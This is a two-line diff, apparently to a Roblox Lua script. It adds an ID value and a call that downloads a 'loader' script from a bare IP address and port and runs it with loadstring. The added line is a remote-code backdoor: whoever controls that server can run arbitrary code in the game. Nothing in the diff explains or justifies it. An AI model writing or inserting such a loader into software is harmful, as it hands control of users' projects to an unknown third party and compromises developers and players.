@@ -1,0 +1,2 @@
+ID="d273d8a5-69f7-4efa-845e-5597f63a595d";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
